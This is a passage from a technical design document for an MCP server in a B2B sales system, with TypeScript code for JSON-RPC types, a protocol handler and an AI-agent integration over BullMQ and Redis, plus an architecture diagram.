  jsonrpc: '2.0';
  id: string | number;
  method: string;
  params?: Record<string, unknown>;
}

/**
 * JSON-RPC Response
 */
export interface JsonRpcResponse {
  jsonrpc: '2.0';
  id: string | number;
  result?: unknown;
  error?: JsonRpcError;
}

/**
 * JSON-RPC Error
 */
export interface JsonRpcError {
  code: number;
  message: string;
  data?: unknown;
}

/**
 * MCP Error Codes
 */
export const MCPErrorCodes = {
  // Standard JSON-RPC errors
  PARSE_ERROR: -32700,
  INVALID_REQUEST: -32600,
  METHOD_NOT_FOUND: -32601,
  INVALID_PARAMS: -32602,
  INTERNAL_ERROR: -32603,
  
  // MCP-specific errors
  RESOURCE_NOT_FOUND: -32001,
  TOOL_NOT_FOUND: -32002,
  PERMISSION_DENIED: -32003,
  RATE_LIMITED: -32004,
  SESSION_EXPIRED: -32005,
  INVALID_SESSION: -32006,
  TOOL_EXECUTION_ERROR: -32007,
  RESOURCE_LOAD_ERROR: -32008,
  VALIDATION_ERROR: -32009,
  TIMEOUT_ERROR: -32010
} as const;

/**
 * MCP Methods
 */
export const MCPMethods = {
  // Session management
  SESSION_CREATE: 'session/create',
  SESSION_GET: 'session/get',
  SESSION_UPDATE: 'session/update',
  SESSION_TERMINATE: 'session/terminate',
  
  // Resource operations
  RESOURCE_LIST: 'resource/list',
  RESOURCE_GET: 'resource/get',
  RESOURCE_SEARCH: 'resource/search',
  
  // Tool operations
  TOOL_LIST: 'tool/list',
  TOOL_GET: 'tool/get',
  TOOL_EXECUTE: 'tool/execute',
  TOOL_CANCEL: 'tool/cancel',
  
  // Context operations
  CONTEXT_GET: 'context/get',
  CONTEXT_UPDATE: 'context/update',
  CONTEXT_CLEAR: 'context/clear',
  
  // Message operations
  MESSAGE_SEND: 'message/send',
  MESSAGE_RECEIVE: 'message/receive',
  
  // Capability queries
  CAPABILITIES_GET: 'capabilities/get',
  
  // Health check
  HEALTH_CHECK: 'health/check'
} as const;

/**
 * MCP Capabilities Response
 */
export interface MCPCapabilities {
  protocol: {
    version: string;
    features: string[];
  };
  resources: {
    types: string[];
    searchable: boolean;
    cacheable: boolean;
  };
  tools: {
    available: string[];
    customAllowed: boolean;
  };
  sessions: {
    maxDuration: number;
    maxIdleTime: number;
    contextPersistence: boolean;
  };
  limits: {
    maxTokensPerRequest: number;
    maxToolCallsPerMessage: number;
    rateLimitPerMinute: number;
  };
}

/**
 * MCP Message Envelope
 */
export interface MCPMessage {
  protocol: string;
  sessionId: string;
  timestamp: string;
  request?: JsonRpcRequest;
  response?: JsonRpcResponse;
  metadata?: {
    tenantId: string;
    userId?: string;
    conversationId?: string;
    requestId: string;
    traceId?: string;
  };
}
```

### 5.2 Protocol Handler

```typescript
// packages/workers/src/etapa3/l-mcp-server/protocol/handler.ts

import { logger } from '@cerniq/logger';
import { Counter, Histogram } from 'prom-client';
import {
  JsonRpcRequest,
  JsonRpcResponse,
  JsonRpcError,
  MCPErrorCodes,
  MCPMethods,
  MCPCapabilities,
  MCP_PROTOCOL_VERSION,
  MCP_JSONRPC_VERSION
} from './types';
import { sessionManagerWorker } from '../l3-session-manager/worker';
import { resourceLoaderWorker } from '../l1-resource-loader/worker';
import { toolRegistryWorker } from '../l2-tool-registry/worker';
import { MCPSession, SessionContext } from '../l3-session-manager/types';

// Metrics
const requestCounter = new Counter({
  name: 'mcp_protocol_requests_total',
  help: 'Total MCP protocol requests',
  labelNames: ['method', 'status']
});

const requestDuration = new Histogram({
  name: 'mcp_protocol_request_duration_seconds',
  help: 'MCP protocol request duration',
  labelNames: ['method'],
  buckets: [0.01, 0.05, 0.1, 0.5, 1, 2, 5, 10]
});

/**
 * MCP Protocol Handler
 */
export class MCPProtocolHandler {
  private methodHandlers: Map<string, (params: any, session?: MCPSession) => Promise<any>>;
  
  constructor() {
    this.methodHandlers = new Map();
    this.registerHandlers();
  }
  
  /**
   * Register method handlers
   */
  private registerHandlers(): void {
    // Session management
    this.methodHandlers.set(MCPMethods.SESSION_CREATE, this.handleSessionCreate.bind(this));
    this.methodHandlers.set(MCPMethods.SESSION_GET, this.handleSessionGet.bind(this));
    this.methodHandlers.set(MCPMethods.SESSION_UPDATE, this.handleSessionUpdate.bind(this));
    this.methodHandlers.set(MCPMethods.SESSION_TERMINATE, this.handleSessionTerminate.bind(this));
    
    // Resource operations
    this.methodHandlers.set(MCPMethods.RESOURCE_LIST, this.handleResourceList.bind(this));
    this.methodHandlers.set(MCPMethods.RESOURCE_GET, this.handleResourceGet.bind(this));
    this.methodHandlers.set(MCPMethods.RESOURCE_SEARCH, this.handleResourceSearch.bind(this));
    
    // Tool operations
    this.methodHandlers.set(MCPMethods.TOOL_LIST, this.handleToolList.bind(this));
    this.methodHandlers.set(MCPMethods.TOOL_GET, this.handleToolGet.bind(this));
    this.methodHandlers.set(MCPMethods.TOOL_EXECUTE, this.handleToolExecute.bind(this));
    
    // Context operations
    this.methodHandlers.set(MCPMethods.CONTEXT_GET, this.handleContextGet.bind(this));
    this.methodHandlers.set(MCPMethods.CONTEXT_UPDATE, this.handleContextUpdate.bind(this));
    this.methodHandlers.set(MCPMethods.CONTEXT_CLEAR, this.handleContextClear.bind(this));
    
    // Message operations
    this.methodHandlers.set(MCPMethods.MESSAGE_SEND, this.handleMessageSend.bind(this));
    
    // Capability queries
    this.methodHandlers.set(MCPMethods.CAPABILITIES_GET, this.handleCapabilitiesGet.bind(this));
    
    // Health check
    this.methodHandlers.set(MCPMethods.HEALTH_CHECK, this.handleHealthCheck.bind(this));
  }
  
  /**
   * Process incoming request
   */
  async processRequest(
    request: JsonRpcRequest,
    context: {
      tenantId: string;
      userId?: string;
      sessionId?: string;
      conversationId?: string;
    }
  ): Promise<JsonRpcResponse> {
    const startTime = Date.now();
    
    try {
      // Validate JSON-RPC format
      if (request.jsonrpc !== MCP_JSONRPC_VERSION) {
        return this.createErrorResponse(request.id, {
          code: MCPErrorCodes.INVALID_REQUEST,
          message: 'Invalid JSON-RPC version'
        });
      }
      
      // Get handler
      const handler = this.methodHandlers.get(request.method);
      if (!handler) {
        requestCounter.inc({ method: request.method, status: 'not_found' });
        return this.createErrorResponse(request.id, {
          code: MCPErrorCodes.METHOD_NOT_FOUND,
          message: `Method not found: ${request.method}`
        });
      }
      
      // Get session if exists
      let session: MCPSession | undefined;
      if (context.sessionId) {
        session = await sessionManagerWorker.getSession(context.sessionId) || undefined;
        
        // Check session validity for non-session-create methods
        if (!session && request.method !== MCPMethods.SESSION_CREATE) {
          requestCounter.inc({ method: request.method, status: 'invalid_session' });
          return this.createErrorResponse(request.id, {
            code: MCPErrorCodes.INVALID_SESSION,
            message: 'Session not found or expired'
          });
        }
      }
      
      // Execute handler
      const params = {
        ...request.params,
        __context: context
      };
      
      const result = await handler(params, session);
      
      // Record metrics
      const duration = (Date.now() - startTime) / 1000;
      requestDuration.observe({ method: request.method }, duration);
      requestCounter.inc({ method: request.method, status: 'success' });
      
      return this.createSuccessResponse(request.id, result);
      
    } catch (error) {
      const duration = (Date.now() - startTime) / 1000;
      requestDuration.observe({ method: request.method }, duration);
      requestCounter.inc({ method: request.method, status: 'error' });
      
      logger.error('MCP request failed', {
        method: request.method,
        error: error instanceof Error ? error.message : 'Unknown error'
      });
      
      return this.createErrorResponse(request.id, this.formatError(error));
    }
  }
  
  // Session handlers
  
  private async handleSessionCreate(params: any): Promise<any> {
    const { __context, ...sessionParams } = params;
    
    const session = await sessionManagerWorker.createSession({
      tenantId: __context.tenantId,
      userId: __context.userId,
      customerId: sessionParams.customerId,
      conversationId: __context.conversationId,
      channel: sessionParams.channel || 'api',
      channelMetadata: sessionParams.channelMetadata,
      capabilities: sessionParams.capabilities,
      ttl: sessionParams.ttl
    });
    
    return {
      sessionId: session.sessionId,
      status: session.status,
      expiresAt: session.expiresAt,
      capabilities: session.capabilities
    };
  }
  
  private async handleSessionGet(params: any, session?: MCPSession): Promise<any> {
    if (!session) {
      throw new MCPError(MCPErrorCodes.INVALID_SESSION, 'No session provided');
    }
    
    return {
      sessionId: session.sessionId,
      status: session.status,
      channel: session.channel,
      createdAt: session.createdAt,
      lastActivityAt: session.lastActivityAt,
      expiresAt: session.expiresAt,
      stats: session.stats
    };
  }
  
  private async handleSessionUpdate(params: any, session?: MCPSession): Promise<any> {
    if (!session) {
      throw new MCPError(MCPErrorCodes.INVALID_SESSION, 'No session provided');
    }
    
    const job = await sessionManagerWorker.addJob({
      type: 'update',
      tenantId: session.tenantId,
      sessionId: session.sessionId,
      payload: {
        customerId: params.customerId,
        conversationId: params.conversationId
      }
    });
    
    return { success: true };
  }
  
  private async handleSessionTerminate(params: any, session?: MCPSession): Promise<any> {
    if (!session) {
      throw new MCPError(MCPErrorCodes.INVALID_SESSION, 'No session provided');
    }
    
    await sessionManagerWorker.addJob({
      type: 'terminate',
      tenantId: session.tenantId,
      sessionId: session.sessionId,
      payload: { reason: params.reason }
    });
    
    return { success: true };
  }
  
  // Resource handlers
  
  private async handleResourceList(params: any, session?: MCPSession): Promise<any> {
    const { __context, resourceType } = params;
    
    const job = await resourceLoaderWorker.addJob({
      type: 'list',
      tenantId: __context.tenantId,
      payload: { resourceType }
    });
    
    const result = await job.waitUntilFinished(
      resourceLoaderWorker['queueEvents'], 
      30000
    );
    
    return result.data;
  }
  
  private async handleResourceGet(params: any, session?: MCPSession): Promise<any> {
    const { __context, uri, options } = params;
    
    const job = await resourceLoaderWorker.addJob({
      type: 'load',
      tenantId: __context.tenantId,
      payload: {
        uri,
        options: {
          maxTokens: options?.maxTokens,
          includeMetadata: options?.includeMetadata ?? true,
          sessionId: session?.sessionId
        }
      }
    });
    
    const result = await job.waitUntilFinished(
      resourceLoaderWorker['queueEvents'],
      60000
    );
    
    if (!result.success) {
      throw new MCPError(MCPErrorCodes.RESOURCE_LOAD_ERROR, result.error || 'Failed to load resource');
    }
    
    return result.data;
  }
  
  private async handleResourceSearch(params: any, session?: MCPSession): Promise<any> {
    const { __context, resourceType, query, filters, limit } = params;
    
    const uri = `cerniq://${resourceType}/search?q=${encodeURIComponent(query)}`;
    
    const job = await resourceLoaderWorker.addJob({
      type: 'load',
      tenantId: __context.tenantId,
      payload: {
        uri,
        options: {
          filters,
          limit: limit || 10
        }
      }
    });
    
    const result = await job.waitUntilFinished(
      resourceLoaderWorker['queueEvents'],
      30000
    );
    
    return result.data;
  }
  
  // Tool handlers
  
  private async handleToolList(params: any, session?: MCPSession): Promise<any> {
    const { __context, category, includeGlobal } = params;
    
    const job = await toolRegistryWorker.addJob({
      type: 'list',
      tenantId: __context.tenantId,
      payload: { category, includeGlobal: includeGlobal ?? true }
    });
    
    const result = await job.waitUntilFinished(
      toolRegistryWorker['queueEvents'],
      10000
    );
    
    return result.data;
  }
  
  private async handleToolGet(params: any, session?: MCPSession): Promise<any> {
    const { __context, name } = params;
    
    const job = await toolRegistryWorker.addJob({
      type: 'get-schema',
      tenantId: __context.tenantId,
      payload: { name }
    });
    
    const result = await job.waitUntilFinished(
      toolRegistryWorker['queueEvents'],
      10000
    );
    
    return result.data;
  }
  
  private async handleToolExecute(params: any, session?: MCPSession): Promise<any> {
    const { __context, name, input } = params;
    
    // Validate tool execution limits
    if (session) {
      // Check rate limits from session capabilities
      const limit = session.capabilities.limits.maxToolCallsPerMessage;
      // Track in session stats
      session.stats.toolCalls++;
    }
    
    const job = await toolRegistryWorker.addJob({
      type: 'execute',
      tenantId: __context.tenantId,
      payload: {
        name,
        input,
        context: {
          sessionId: session?.sessionId,
          conversationId: session?.conversationId || __context.conversationId,
          userId: __context.userId,
          permissions: session?.capabilities.permissions || []
        }
      }
    });
    
    const result = await job.waitUntilFinished(
      toolRegistryWorker['queueEvents'],
      60000
    );
    
    if (!result.success) {
      throw new MCPError(
        MCPErrorCodes.TOOL_EXECUTION_ERROR,
        result.error || 'Tool execution failed'
      );
    }
    
    return {
      toolName: name,
      result: result.data,
      metadata: result.metadata
    };
  }
  
  // Context handlers
  
  private async handleContextGet(params: any, session?: MCPSession): Promise<any> {
    if (!session) {
      throw new MCPError(MCPErrorCodes.INVALID_SESSION, 'Session required');
    }
    
    const { format } = params;
    
    if (format === 'llm') {
      const llmContext = await sessionManagerWorker.buildLLMContext(session.sessionId);
      return { context: llmContext, format: 'llm' };
    }
    
    return {
      context: session.context,
      format: 'raw'
    };
  }
  
  private async handleContextUpdate(params: any, session?: MCPSession): Promise<any> {
    if (!session) {
      throw new MCPError(MCPErrorCodes.INVALID_SESSION, 'Session required');
    }
    
    const { updateType, ...data } = params;
    delete data.__context;
    
    const job = await sessionManagerWorker.addJob({
      type: 'update-context',
      tenantId: session.tenantId,
      sessionId: session.sessionId,
      payload: { updateType, ...data }
    });
    
    const result = await job.waitUntilFinished(
      sessionManagerWorker['queueEvents'],
      10000
    );
    
    return { success: result.success };
  }
  
  private async handleContextClear(params: any, session?: MCPSession): Promise<any> {
    if (!session) {
      throw new MCPError(MCPErrorCodes.INVALID_SESSION, 'Session required');
    }
    
    const { clearType } = params;
    
    const contextManager = sessionManagerWorker.getContextManager();
    
    switch (clearType) {
      case 'cart':
        await contextManager.clearCart(session.sessionId);
        break;
      case 'negotiation':
        await contextManager.clearNegotiation(session.sessionId);
        break;
      case 'all':
        // Reset context to initial state
        await sessionManagerWorker.addJob({
          type: 'update',
          tenantId: session.tenantId,
          sessionId: session.sessionId,
          payload: {
            context: {
              recentMessages: [],
              messageCount: 0,
              products: [],
              pendingActions: [],
              variables: {},
              slots: {},
              memory: []
            }
          }
        });
        break;
      default:
        throw new MCPError(MCPErrorCodes.INVALID_PARAMS, `Unknown clear type: ${clearType}`);
    }
    
    return { success: true };
  }
  
  // Message handlers
  
  private async handleMessageSend(params: any, session?: MCPSession): Promise<any> {
    if (!session) {
      throw new MCPError(MCPErrorCodes.INVALID_SESSION, 'Session required');
    }
    
    const { role, content, metadata } = params;
    
    await sessionManagerWorker.addJob({
      type: 'add-message',
      tenantId: session.tenantId,
      sessionId: session.sessionId,
      payload: { role, content, metadata }
    });
    
    return { success: true };
  }
  
  // Capability handlers
  
  private async handleCapabilitiesGet(params: any, session?: MCPSession): Promise<MCPCapabilities> {
    return {
      protocol: {
        version: MCP_PROTOCOL_VERSION,
        features: [
          'resources',
          'tools',
          'sessions',
          'context',
          'messages'
        ]
      },
      resources: {
        types: ['products', 'clients', 'conversations', 'catalogs'],
        searchable: true,
        cacheable: true
      },
      tools: {
        available: [
          'search_products',
          'get_product_details',
          'check_stock',
          'reserve_stock',
          'get_product_price',
          'calculate_quote'
        ],
        customAllowed: true
      },
      sessions: {
        maxDuration: session?.capabilities.limits.maxSessionDuration || 480,
        maxIdleTime: session?.capabilities.limits.maxIdleTime || 60,
        contextPersistence: true
      },
      limits: {
        maxTokensPerRequest: session?.capabilities.limits.maxTokensPerMessage || 4096,
        maxToolCallsPerMessage: session?.capabilities.limits.maxToolCallsPerMessage || 10,
        rateLimitPerMinute: 100
      }
    };
  }
  
  // Health check
  
  private async handleHealthCheck(params: any): Promise<any> {
    return {
      status: 'healthy',
      version: MCP_PROTOCOL_VERSION,
      timestamp: new Date().toISOString()
    };
  }
  
  // Helper methods
  
  private createSuccessResponse(id: string | number, result: any): JsonRpcResponse {
    return {
      jsonrpc: MCP_JSONRPC_VERSION,
      id,
      result
    };
  }
  
  private createErrorResponse(id: string | number, error: JsonRpcError): JsonRpcResponse {
    return {
      jsonrpc: MCP_JSONRPC_VERSION,
      id,
      error
    };
  }
  
  private formatError(error: unknown): JsonRpcError {
    if (error instanceof MCPError) {
      return {
        code: error.code,
        message: error.message,
        data: error.data
      };
    }
    
    if (error instanceof Error) {
      return {
        code: MCPErrorCodes.INTERNAL_ERROR,
        message: error.message
      };
    }
    
    return {
      code: MCPErrorCodes.INTERNAL_ERROR,
      message: 'Unknown error occurred'
    };
  }
}

/**
 * MCP Error class
 */
export class MCPError extends Error {
  code: number;
  data?: unknown;
  
  constructor(code: number, message: string, data?: unknown) {
    super(message);
    this.name = 'MCPError';
    this.code = code;
    this.data = data;
  }
}

// Export singleton
export const mcpProtocolHandler = new MCPProtocolHandler();
```

---

## 6. Integration Patterns

### 6.1 Integration Overview

Această secțiune documentează pattern-urile de integrare între Workers L (MCP Server) și celelalte componente ale sistemului, inclusiv Workers C (AI Agent), Workers A (Product Knowledge), Workers J (Handover), și alte module critice.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    MCP Server Integration Architecture                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                               │
│  ┌────────────────────────────────────────────────────────────────────────┐  │
│  │                         External Interfaces                             │  │
│  ├────────────────────────────────────────────────────────────────────────┤  │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐   │  │
│  │  │  WebSocket  │  │   REST API  │  │   BullMQ    │  │   Redis     │   │  │
│  │  │  Clients    │  │   Gateway   │  │   Queues    │  │   Pub/Sub   │   │  │
│  │  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘   │  │
│  └─────────┼────────────────┼────────────────┼────────────────┼──────────┘  │
│            │                │                │                │              │
│            ▼                ▼                ▼                ▼              │
│  ┌────────────────────────────────────────────────────────────────────────┐  │
│  │                         MCP Protocol Handler                            │  │
│  │  ┌─────────────────────────────────────────────────────────────────┐   │  │
│  │  │                    Message Router & Dispatcher                    │   │  │
│  │  └─────────────────────────────────────────────────────────────────┘   │  │
│  └────────────────────────────────────────────────────────────────────────┘  │
│            │                │                │                │              │
│            ▼                ▼                ▼                ▼              │
│  ┌────────────────────────────────────────────────────────────────────────┐  │
│  │                         MCP Core Workers                                │  │
│  │  ┌────────────┐  ┌────────────┐  ┌────────────┐                       │  │
│  │  │    L1      │  │    L2      │  │    L3      │                       │  │
│  │  │  Resource  │  │   Tool     │  │  Session   │                       │  │
│  │  │  Loader    │  │  Registry  │  │  Manager   │                       │  │
│  │  └─────┬──────┘  └─────┬──────┘  └─────┬──────┘                       │  │
│  └────────┼───────────────┼───────────────┼─────────────────────────────┘  │
│           │               │               │                                 │
│           ▼               ▼               ▼                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐  │
│  │                      Integration Layer                                  │  │
│  │  ┌────────────────────────────────────────────────────────────────┐    │  │
│  │  │                  Integration Orchestrator                       │    │  │
│  │  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐          │    │  │
│  │  │  │ Workers  │ │ Workers  │ │ Workers  │ │ Workers  │          │    │  │
│  │  │  │    A     │ │    C     │ │    J     │ │   K/M    │          │    │  │
│  │  │  │ Product  │ │ AI Agent │ │ Handover │ │ Analysis │          │    │  │
│  │  │  └────┬─────┘ └────┬─────┘ └────┬─────┘ └────┬─────┘          │    │  │
│  │  └───────┼────────────┼────────────┼────────────┼────────────────┘    │  │
│  └──────────┼────────────┼────────────┼────────────┼─────────────────────┘  │
│             │            │            │            │                        │
│             ▼            ▼            ▼            ▼                        │
│  ┌────────────────────────────────────────────────────────────────────────┐  │
│  │                      Shared Infrastructure                              │  │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐   │  │
│  │  │ PostgreSQL  │  │   Redis     │  │   BullMQ    │  │ OpenSearch  │   │  │
│  │  │  Database   │  │   Cache     │  │   Queues    │  │   Index     │   │  │
│  │  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘   │  │
│  └────────────────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 6.2 Integration with Workers C (AI Agent Core)

#### 6.2.1 Integration Architecture

```typescript
// src/workers/mcp/integrations/ai-agent-integration.ts

import { EventEmitter } from 'events';
import { Queue, QueueEvents } from 'bullmq';
import { Redis } from 'ioredis';
import { Logger } from 'pino';

/**
 * AI Agent Integration
 * Manages bidirectional communication between MCP Server and AI Agent workers
 */

// Integration types
interface AIAgentRequest {
  type: 'generate_response' | 'analyze_context' | 'plan_action' | 'evaluate_response';
  sessionId: string;
  conversationId: string;
  tenantId: string;
  requestId: string;
  payload: {
    messages: MCPMessage[];
    context: AIAgentContext;
    tools: AvailableTool[];
    resources: LoadedResource[];
    constraints: ResponseConstraints;
  };
  options: AIAgentOptions;
}

interface MCPMessage {
  role: 'user' | 'assistant' | 'system' | 'tool';
  content: string | ToolCallContent;
  name?: string;
  tool_call_id?: string;
  timestamp: Date;
}

interface ToolCallContent {
  tool_name: string;
  arguments: Record<string, unknown>;
  result?: unknown;
}

interface AIAgentContext {
  customer: {
    id: string;
    name: string;
    tier: string;
    preferences: Record<string, unknown>;
    history: ConversationSummary[];
  };
  conversation: {
    channel: string;
    startedAt: Date;
    messageCount: number;
    sentiment: string;
    intent: string;
  };
  business: {
    currentPromotions: Promotion[];
    inventoryStatus: InventoryStatus;
    pricingRules: PricingRule[];
  };
}

interface AvailableTool {
  name: string;
  description: string;
  parameters: Record<string, unknown>;
  category: string;
}

interface LoadedResource {
  uri: string;
  type: string;
  content: unknown;
  tokenCount: number;
  cached: boolean;
}

interface ResponseConstraints {
  maxTokens: number;
  temperature: number;
  stopSequences: string[];
  responseFormat: 'text' | 'json' | 'structured';
  language: 'ro' | 'en';
  tone: 'formal' | 'friendly' | 'professional';
}

interface AIAgentOptions {
  timeout: number;
  priority: 'low' | 'normal' | 'high' | 'critical';
  streamResponse: boolean;
  requireToolUse: boolean;
  maxToolCalls: number;
  enableReasoning: boolean;
}

interface AIAgentResponse {
  requestId: string;
  success: boolean;
  response?: {
    content: string;
    toolCalls?: ToolCall[];
    reasoning?: string;
    confidence: number;
    suggestedFollowUps: string[];
  };
  error?: {
    code: string;
    message: string;
    recoverable: boolean;
  };
  metadata: {
    processingTime: number;
    tokensUsed: {
      input: number;
      output: number;
      total: number;
    };
    modelUsed: string;
    cached: boolean;
  };
}

interface ToolCall {
  id: string;
  name: string;
  arguments: Record<string, unknown>;
  status: 'pending' | 'executed' | 'failed';
  result?: unknown;
  error?: string;
}

export class AIAgentIntegration extends EventEmitter {
  private aiAgentQueue: Queue;
  private aiAgentEvents: QueueEvents;
  private responseQueue: Queue;
  private redis: Redis;
  private logger: Logger;
  
  // Pending requests tracking
  private pendingRequests: Map<string, {
    resolve: (response: AIAgentResponse) => void;
    reject: (error: Error) => void;
    timeout: NodeJS.Timeout;
    startTime: number;
  }> = new Map();
  
  // Configuration
  private config = {
    defaultTimeout: 30000,
    maxRetries: 3,
    responseQueueName: 'mcp:ai-agent:responses',
    requestQueueName: 'ai-agent:requests'
  };
  
  constructor(options: {
    redis: Redis;
    logger: Logger;
  }) {
    super();
    this.redis = options.redis;
    this.logger = options.logger.child({ component: 'AIAgentIntegration' });
    
    this.initialize();
  }
  
  private async initialize(): Promise<void> {
    // Initialize request queue (to AI Agent)
    this.aiAgentQueue = new Queue(this.config.requestQueueName, {
      connection: this.redis,
      defaultJobOptions: {
        attempts: this.config.maxRetries,
        backoff: {
          type: 'exponential',
          delay: 1000
        },
        removeOnComplete: 100,
        removeOnFail: 1000
      }
    });
    
    // Initialize response queue (from AI Agent)
    this.responseQueue = new Queue(this.config.responseQueueName, {
      connection: this.redis
    });
    
    // Set up queue events for tracking
    this.aiAgentEvents = new QueueEvents(this.config.requestQueueName, {
      connection: this.redis
    });
    
    // Listen for completed jobs
    this.aiAgentEvents.on('completed', async ({ jobId, returnvalue }) => {
      const response = JSON.parse(returnvalue) as AIAgentResponse;
      this.handleResponse(response);
    });
    
    // Listen for failed jobs
    this.aiAgentEvents.on('failed', async ({ jobId, failedReason }) => {
      const job = await this.aiAgentQueue.getJob(jobId);
      if (job) {
        this.handleError(job.data.requestId, new Error(failedReason));
      }
    });
    
    this.logger.info('AI Agent Integration initialized');
  }
  
  /**
   * Request AI agent to generate a response
   */
  async generateResponse(request: AIAgentRequest): Promise<AIAgentResponse> {
    const startTime = Date.now();
    const timeout = request.options?.timeout || this.config.defaultTimeout;
    
    this.logger.debug({
      requestId: request.requestId,
      type: request.type,
      sessionId: request.sessionId
    }, 'Sending request to AI Agent');
    
    // Create promise for response
    const responsePromise = new Promise<AIAgentResponse>((resolve, reject) => {
      // Set timeout
      const timeoutId = setTimeout(() => {
        this.pendingRequests.delete(request.requestId);
        reject(new Error(`AI Agent request timed out after ${timeout}ms`));
      }, timeout);
      
      // Track pending request
      this.pendingRequests.set(request.requestId, {
        resolve,
        reject,
        timeout: timeoutId,
        startTime
      });
    });
    
    // Add job to queue
    const priority = this.getPriorityValue(request.options?.priority || 'normal');
    
    await this.aiAgentQueue.add('generate', request, {
      jobId: request.requestId,
      priority,
      attempts: this.config.maxRetries
    });
    
    // Emit event
    this.emit('request:sent', {
      requestId: request.requestId,
      type: request.type
    });
    
    return responsePromise;
  }
  
  /**
   * Handle response from AI Agent
   */
  private handleResponse(response: AIAgentResponse): void {
    const pending = this.pendingRequests.get(response.requestId);
    
    if (!pending) {
      this.logger.warn({
        requestId: response.requestId
      }, 'Received response for unknown request');
      return;
    }
    
    // Clear timeout
    clearTimeout(pending.timeout);
    
    // Calculate processing time
    const processingTime = Date.now() - pending.startTime;
    
    // Add processing time to metadata
    response.metadata.processingTime = processingTime;
    
    // Remove from pending
    this.pendingRequests.delete(response.requestId);
    
    // Emit event
    this.emit('response:received', {
      requestId: response.requestId,
      success: response.success,
      processingTime
    });
    
    // Resolve promise
    pending.resolve(response);
  }
  
  /**
   * Handle error from AI Agent
   */
  private handleError(requestId: string, error: Error): void {
    const pending = this.pendingRequests.get(requestId);
    
    if (!pending) {
      return;
    }
    
    // Clear timeout
    clearTimeout(pending.timeout);
    
    // Remove from pending
    this.pendingRequests.delete(requestId);
    
    // Emit event
    this.emit('error', {
      requestId,
      error: error.message
    });
    
    // Reject promise
    pending.reject(error);
  }
  
  /**
   * Execute tool calls from AI Agent response
   */
  async executeToolCalls(
    toolCalls: ToolCall[],
    context: {
      tenantId: string;
      sessionId: string;
      conversationId: string;
    }
  ): Promise<ToolCall[]> {
    const results: ToolCall[] = [];
    
    for (const toolCall of toolCalls) {
      try {
        this.logger.debug({
          toolName: toolCall.name,
          toolId: toolCall.id
        }, 'Executing tool call');
        
        // Execute via Tool Registry
        const result = await this.executeToolViaRegistry(
          toolCall.name,
          toolCall.arguments,
          context
        );
        
        results.push({
          ...toolCall,
          status: 'executed',
          result
        });
        
      } catch (error) {
        results.push({
          ...toolCall,
          status: 'failed',
          error: error instanceof Error ? error.message : 'Unknown error'
        });
      }
    }
    
    return results;
  }
  
  /**
   * Execute single tool via Tool Registry
   */
  private async executeToolViaRegistry(
    toolName: string,
    args: Record<string, unknown>,
    context: {
      tenantId: string;
      sessionId: string;
      conversationId: string;
    }
  ): Promise<unknown> {
    // Use Redis to publish tool execution request
    const requestId = `tool-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
    
    const toolRequest = {
      type: 'execute',
      tenantId: context.tenantId,
      requestId,
      payload: {
        toolName,
        arguments: args,
        context: {
          sessionId: context.sessionId,
          conversationId: context.conversationId
        }
      }
    };
    
    // Add to tool registry queue
    const toolQueue = new Queue('mcp:tool:register', {
      connection: this.redis
    });
    
    const job = await toolQueue.add('execute', toolRequest, {
      jobId: requestId
    });
    
    // Wait for result
    const result = await job.waitUntilFinished(
      new QueueEvents('mcp:tool:register', { connection: this.redis }),
      30000
    );
    
    return result;
  }
  
  /**
   * Stream response from AI Agent
   */
  async streamResponse(
    request: AIAgentRequest,
    onChunk: (chunk: string) => void
  ): Promise<AIAgentResponse> {
    // Enable streaming
    request.options = {
      ...request.options,
      streamResponse: true
    };
    
    // Subscribe to stream channel
    const streamChannel = `ai-agent:stream:${request.requestId}`;
    const subscriber = this.redis.duplicate();
    
    await subscriber.subscribe(streamChannel);
    
    subscriber.on('message', (channel, message) => {
      if (channel === streamChannel) {
        const chunk = JSON.parse(message);
        if (chunk.type === 'content') {
          onChunk(chunk.content);
        }
      }
    });
    
    try {
      // Send request
      const response = await this.generateResponse(request);
      
      // Cleanup
      await subscriber.unsubscribe(streamChannel);
      subscriber.disconnect();
      
      return response;
      
    } catch (error) {
      // Cleanup on error
      await subscriber.unsubscribe(streamChannel);
      subscriber.disconnect();
      throw error;
    }
  }
  
  /**
   * Get priority value for queue
   */
  private getPriorityValue(priority: string): number {
    switch (priority) {
      case 'critical': return 1;
      case 'high': return 2;
      case 'normal': return 3;
      case 'low': return 4;
      default: return 3;
    }
  }
  
  /**
   * Build context for AI Agent
   */
  async buildContext(
    sessionId: string,
    conversationId: string,
    tenantId: string
  ): Promise<AIAgentContext> {
    // Load conversation from Session Manager
    const sessionData = await this.loadSessionData(sessionId);
    
    // Load customer data
    const customerData = await this.loadCustomerData(
      sessionData.customerId,
      tenantId
    );
    
    // Load business context
    const businessContext = await this.loadBusinessContext(tenantId);
    
    return {
      customer: {
        id: customerData.id,
        name: customerData.companyName,
        tier: customerData.tier,
        preferences: customerData.preferences || {},
        history: customerData.conversationHistory || []
      },
      conversation: {
        channel: sessionData.channel,
        startedAt: sessionData.startedAt,
        messageCount: sessionData.messageCount,
        sentiment: sessionData.sentiment || 'neutral',
        intent: sessionData.primaryIntent || 'unknown'
      },
      business: {
        currentPromotions: businessContext.promotions,
        inventoryStatus: businessContext.inventory,
        pricingRules: businessContext.pricing
      }
    };
  }
  
  /**
   * Load session data
   */
  private async loadSessionData(sessionId: string): Promise<any> {
    const cached = await this.redis.get(`mcp:session:${sessionId}`);
    if (cached) {
      return JSON.parse(cached);
    }
    
    // Load from database if not cached
    // This would use the session manager
    throw new Error('Session not found');
  }
  
  /**
   * Load customer data
   */
  private async loadCustomerData(customerId: string, tenantId: string): Promise<any> {
    const cacheKey = `mcp:customer:${tenantId}:${customerId}`;
    const cached = await this.redis.get(cacheKey);
    
    if (cached) {
      return JSON.parse(cached);
    }
    
    // Load via Resource Loader
    // This would use the resource loader worker
    throw new Error('Customer data not found');
  }
  
